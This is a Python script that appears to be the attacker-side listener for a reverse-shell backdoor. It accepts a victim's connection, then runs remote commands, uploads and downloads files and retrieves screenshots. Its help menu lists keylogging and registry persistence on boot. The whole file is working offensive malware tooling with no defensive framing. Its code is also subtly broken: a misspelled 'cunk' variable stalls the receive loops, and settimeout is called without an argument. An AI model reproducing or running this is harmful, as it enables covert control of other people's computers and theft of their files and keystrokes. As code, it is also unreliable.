import socket
import termcolor
import json
import os
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            cunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout()
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())
def target_communication():
    count = 0 
    while True:
        command = input('*Sh311~%s: '% str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3]== 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
             f = open('screenshot%d'%(count), 'wb')
             target.settimeout(3)
             target.settimeout(1)
             chunk = target.recv(1024)
             while chunk:
                 f.write(chunk)
                 try:
                     cunk = target.recv(1024)
                 except socket.timeout as e:
                     break
             target.settimeout()
             f.close()
             count += 1
        elif command =='help':
            print(termcolor.colored('''\n
            quit                              : Quit session
            clear                             : clear screen
            cd                                :  change disrectory
            upload *filename*                 : uploads file to target machine
            download *filename*               : download file from targte machine
            keylog_start                      : starts  keylogger
            keylogger_dump                    : print keystrokes
            keylogger_stop                    : stop and removes keylogger
            persistence *regname* *filename*  : re-start on boot
            '''))
        else:
            result = reliable_recv()
            print(result)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.bind(('192.168.1.1', 8080))
sock.bind(('127.0.0.1', 8080))
print(termcolor.colored('[~] Listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[!] Target connected from: ' + str(ip), 'green'))
target_communication()
